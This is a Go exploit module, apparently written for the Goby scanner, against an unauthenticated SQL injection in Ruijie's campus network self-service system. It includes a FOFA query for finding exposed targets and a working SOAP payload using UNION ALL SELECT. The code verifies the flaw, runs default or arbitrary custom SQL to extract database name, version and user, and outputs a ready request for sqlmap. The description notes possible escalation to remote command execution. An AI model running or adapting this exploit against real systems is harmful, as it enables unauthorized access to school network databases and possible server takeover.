package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie campus network self-service system /operatorReportorRoamService SQL Injection Vulnerability",
    "Description": "<p>Ruijie campus network self-service system is a solution for school and campus network management launched by Ruijie network. The system is designed to provide convenient network self-service, enabling students, faculty, staff, and network administrators to better manage and utilize campus network resources. </p><p>There is a SQL injection vulnerability in the operatorReportorRoamService interface of Ruijie Campus Network self-service system, which can be exploited by an unauthenticated attacker to obtain database operation permissions, and further use os-shell to realize remote command execution, which has the risk of server being controlled.</p>",
    "Product": "Ruijie campus network self-service system",
    "Homepage": "https://www.ruijie.com.cn/fw/zxpx/87676/",
    "DisclosureDate": "2024-04-22",
    "PostTime": "2024-11-06",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title==\"校园网自助服务系统\" && body=\"entry.jsp\"",
    "GobyQuery": "title==\"校园网自助服务系统\" && body=\"entry.jsp\"",
    "Level": "1",
    "Impact": "<p>There is a SQL injection vulnerability in the operatorReportorRoamService interface of Ruijie Campus Network self-service system, which can be exploited by an unauthenticated attacker to obtain database operation permissions, and further use os-shell to realize remote command execution, which has the risk of server being controlled.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/138083364"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT @@VERSION",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "锐捷校园网自助服务系统 /operatorReportorRoamService SQL 注入漏洞",
            "Product": "锐捷校园网自助服务系统",
            "Description": "<p>锐捷校园网自助服务系统是锐捷网络推出的一款面向学校和校园网络管理的解决方案。该系统旨在提供便捷的网络自助服务，使学生、教职员工和网络管理员能够更好地管理和利用校园网络资源。<br></p><p>锐捷校园网自助服务系统 operatorReportorRoamService 接口存在SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库操作权限，进一步利用os-shell可实现远程命令执行，存在服务器被控的风险。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>锐捷校园网自助服务系统&nbsp;operatorReportorRoamService 接口存在SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库操作权限，进一步利用os-shell可实现远程命令执行，存在服务器被控的风险。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Ruijie campus network self-service system /operatorReportorRoamService SQL Injection Vulnerability",
            "Product": "Ruijie campus network self-service system",
            "Description": "<p>Ruijie campus network self-service system is a solution for school and campus network management launched by Ruijie network. The system is designed to provide convenient network self-service, enabling students, faculty, staff, and network administrators to better manage and utilize campus network resources.&nbsp;</p><p>There is a SQL injection vulnerability in the operatorReportorRoamService interface of Ruijie Campus Network self-service system, which can be exploited by an unauthenticated attacker to obtain database operation permissions, and further use os-shell to realize remote command execution, which has the risk of server being controlled.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the operatorReportorRoamService interface of Ruijie Campus Network self-service system, which can be exploited by an unauthenticated attacker to obtain database operation permissions, and further use os-shell to realize remote command execution, which has the risk of server being controlled.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	setSqlPayloadHashsajfgyhasyjgfygasfgdyyatsgftyeagvfthcsgatkydcgukasgygdftgasyfcay := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
<soapenv:Header/>
    <soapenv:Body>
    <ser:queryOperatorUuid>
      <!--type: string-->
      <ser:in0>1' UNION ALL SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+(` + sql + `)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(98)+CHAR(113))-- Rqvh</ser:in0>
    </ser:queryOperatorUuid>
    </soapenv:Body>
</soapenv:Envelope>`
			postRequest := httpclient.NewPostRequestConfig(sqlUrl)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Header.Store("Content-Type", "text/xml;charset=UTF-8")
			postRequest.Data = sql
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/selfservice/service/operatorReportorRoamService"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/selfservice/service/operatorReportorRoamService"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "tblgqlvq"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT (CHAR(116)+CHAR(98)+CHAR(108)+CHAR(103)+CHAR(113)+CHAR(108)+CHAR(118)+CHAR(113))`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qzbzq((.|\n)*?)qvvbq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashsajfgyhasyjgfygasfgdyyatsgftyeagvfthcsgatkydcgukasgygdftgasyfcay
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /selfservice/service/operatorReportorRoamService HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: close
Content-Type: text/xml;charset=UTF-8
 
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
<soapenv:Header/>
    <soapenv:Body>
    <ser:queryOperatorUuid>
      <!--type: string-->
      <ser:in0>1' UNION ALL SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+(select '2')+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(98)+CHAR(113))-- Rqvh</ser:in0>
    </ser:queryOperatorUuid>
    </soapenv:Body>
</soapenv:Envelope>`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qzbzq((.|\n)*?)qvvbq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashsajfgyhasyjgfygasfgdyyatsgftyeagvfthcsgatkydcgukasgygdftgasyfcay
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select DB_NAME()"
					} else if way == "db_version" {
						sql = "select @@VERSION"
					} else if way == "user_name" {
						sql = "select SYSTEM_USER"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
